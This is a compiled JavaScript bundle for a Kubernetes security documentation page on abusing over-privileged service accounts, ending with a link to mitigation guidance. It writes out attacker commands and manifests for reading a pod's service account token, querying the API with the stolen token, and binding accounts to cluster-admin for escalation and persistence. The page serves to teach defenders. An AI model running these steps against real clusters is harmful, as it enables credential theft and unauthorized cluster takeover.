"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[6590],{3549:(e,s,t)=>{t.r(s),t.d(s,{assets:()=>o,contentTitle:()=>a,default:()=>u,frontMatter:()=>r,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"attack_vectors/privileged_service_accounts","title":"Privileged Service Accounts","description":"How attackers exploit overly privileged Kubernetes Service Accounts to gain cluster-wide access and escalate privileges.","source":"@site/docs/attack_vectors/privileged_service_accounts.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/privileged_service_accounts","permalink":"/k8s_security/docs/attack_vectors/privileged_service_accounts","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/privileged_service_accounts.md","tags":[],"version":"current","sidebarPosition":13,"frontMatter":{"sidebar_position":13,"title":"Privileged Service Accounts","description":"How attackers exploit overly privileged Kubernetes Service Accounts to gain cluster-wide access and escalate privileges."},"sidebar":"default","previous":{"title":"Denial of Service (DoS) Attacks","permalink":"/k8s_security/docs/attack_vectors/ddos_attacks"},"next":{"title":"Unrestricted HostPath Mounts","permalink":"/k8s_security/docs/attack_vectors/unrestricted_hostpath_mounts"}}');var n=t(4848),c=t(8453);const r={sidebar_position:13,title:"Privileged Service Accounts",description:"How attackers exploit overly privileged Kubernetes Service Accounts to gain cluster-wide access and escalate privileges."},a="Privileged Service Accounts",o={},l=[{value:"Exploitation Steps: Abusing Overprivileged Service Accounts",id:"exploitation-steps-abusing-overprivileged-service-accounts",level:2},{value:"Step 1: Identify Overprivileged Service Accounts",id:"step-1-identify-overprivileged-service-accounts",level:3},{value:"Step 2: Steal Service Account Tokens",id:"step-2-steal-service-account-tokens",level:3},{value:"Step 3: Escalate Privileges Using RBAC Misconfigurations",id:"step-3-escalate-privileges-using-rbac-misconfigurations",level:3},{value:"Step 4: Maintain Persistence in the Cluster",id:"step-4-maintain-persistence-in-the-cluster",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation Steps",id:"mitigation-steps",level:2}];function d(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",p:"p",pre:"pre",strong:"strong",...(0,c.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(s.header,{children:(0,n.jsx)(s.h1,{id:"privileged-service-accounts",children:"Privileged Service Accounts"})}),"\n",(0,n.jsxs)(s.p,{children:[(0,n.jsx)(s.strong,{children:"Service Accounts (SAs)"})," in Kubernetes provide pods with identities to interact with the cluster API. If ",(0,n.jsx)(s.strong,{children:"overprivileged"}),", these accounts can be exploited by attackers to ",(0,n.jsx)(s.strong,{children:"escalate privileges, manipulate cluster resources, or gain persistent access"}),"."]}),"\n",(0,n.jsx)(s.hr,{}),"\n",(0,n.jsx)(s.h2,{id:"exploitation-steps-abusing-overprivileged-service-accounts",children:"Exploitation Steps: Abusing Overprivileged Service Accounts"}),"\n",(0,n.jsxs)(s.p,{children:["An attacker exploits ",(0,n.jsx)(s.strong,{children:"misconfigured Service Accounts"})," to gain unauthorized access to cluster resources."]}),"\n",(0,n.jsx)(s.h3,{id:"step-1-identify-overprivileged-service-accounts",children:"Step 1: Identify Overprivileged Service Accounts"}),"\n",(0,n.jsxs)(s.p,{children:["The attacker lists available ",(0,n.jsx)(s.strong,{children:"Service Accounts"}),":"]}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-bash",children:"kubectl get serviceaccounts --all-namespaces\n"})}),"\n",(0,n.jsxs)(s.p,{children:["Next, they check for ",(0,n.jsx)(s.strong,{children:"excessive permissions"}),":"]}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-bash",children:"kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[].kind==\"ServiceAccount\")'\n"})}),"\n",(0,n.jsxs)(s.p,{children:["If a Service Account has ",(0,n.jsx)(s.strong,{children:"cluster-admin"})," privileges, it is a prime target."]}),"\n",(0,n.jsx)(s.h3,{id:"step-2-steal-service-account-tokens",children:"Step 2: Steal Service Account Tokens"}),"\n",(0,n.jsx)(s.p,{children:"If a pod is running with an overprivileged SA, the attacker accesses its token:"}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-bash",children:"kubectl exec -it attacker-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 --decode\n"})}),"\n",(0,n.jsx)(s.p,{children:"With this token, the attacker authenticates against the Kubernetes API:"}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-bash",children:'export TOKEN=<stolen-token>\ncurl -H "Authorization: Bearer $TOKEN" https://<api-server>/api/v1/nodes\n'})}),"\n",(0,n.jsxs)(s.p,{children:["Now, the attacker can ",(0,n.jsx)(s.strong,{children:"perform API requests with elevated privileges"}),"."]}),"\n",(0,n.jsx)(s.h3,{id:"step-3-escalate-privileges-using-rbac-misconfigurations",children:"Step 3: Escalate Privileges Using RBAC Misconfigurations"}),"\n",(0,n.jsxs)(s.p,{children:["If a Service Account has ",(0,n.jsx)(s.strong,{children:"rolebinding privileges"}),", the attacker ",(0,n.jsx)(s.strong,{children:"grants themselves elevated permissions"}),":"]}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-yaml",children:"apiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: escalate-privileges\n  namespace: default\nsubjects:\n  - kind: User\n    name: attacker\n    apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io\n"})}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-bash",children:"kubectl apply -f escalate-privileges.yaml\n"})}),"\n",(0,n.jsxs)(s.p,{children:["Now, the attacker has ",(0,n.jsx)(s.strong,{children:"cluster-wide administrative control"}),"."]}),"\n",(0,n.jsx)(s.h3,{id:"step-4-maintain-persistence-in-the-cluster",children:"Step 4: Maintain Persistence in the Cluster"}),"\n",(0,n.jsxs)(s.p,{children:["The attacker creates a ",(0,n.jsx)(s.strong,{children:"new Service Account"})," with privileged access:"]}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-yaml",children:"apiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: persistent-access\n  namespace: default\n"})}),"\n",(0,n.jsxs)(s.p,{children:["Then, they bind it to ",(0,n.jsx)(s.strong,{children:"cluster-admin"}),":"]}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-yaml",children:"apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: persist-access\nsubjects:\n  - kind: ServiceAccount\n    name: persistent-access\n    namespace: default\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io\n"})}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-bash",children:"kubectl apply -f persist-access.yaml\n"})}),"\n",(0,n.jsxs)(s.p,{children:["Even if the attacker's original access is revoked, this new ",(0,n.jsx)(s.strong,{children:"Service Account"})," ensures ",(0,n.jsx)(s.strong,{children:"ongoing control over the cluster"}),"."]}),"\n",(0,n.jsx)(s.h3,{id:"result",children:"Result"}),"\n",(0,n.jsxs)(s.p,{children:["The attacker successfully ",(0,n.jsx)(s.strong,{children:"gained persistent access, escalated privileges, and took control over Kubernetes resources"})," through an insecure Service Account."]}),"\n",(0,n.jsx)(s.hr,{}),"\n",(0,n.jsx)(s.h2,{id:"mitigation-steps",children:"Mitigation Steps"}),"\n",(0,n.jsxs)(s.p,{children:["To protect against ",(0,n.jsx)(s.strong,{children:"privileged Service Account abuse"}),", follow the security best practices outlined in:"]}),"\n",(0,n.jsxs)(s.p,{children:["\u27a1 ",(0,n.jsx)(s.strong,{children:(0,n.jsx)(s.a,{href:"/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/service_account_mitigation",children:"Securing Kubernetes Service Accounts"})})]}),"\n",(0,n.jsxs)(s.p,{children:["This guide covers techniques such as ",(0,n.jsx)(s.strong,{children:"restricting RBAC permissions, disabling automatic Service Account mounting, enforcing least privilege, and auditing Service Account usage"})," to prevent unauthorized access."]})]})}function u(e={}){const{wrapper:s}={...(0,c.R)(),...e.components};return s?(0,n.jsx)(s,{...e,children:(0,n.jsx)(d,{...e})}):d(e)}},8453:(e,s,t)=>{t.d(s,{R:()=>r,x:()=>a});var i=t(6540);const n={},c=i.createContext(n);function r(e){const s=i.useContext(c);return i.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(n):e.components||n:r(e.components),i.createElement(c.Provider,{value:s},e.children)}}}]);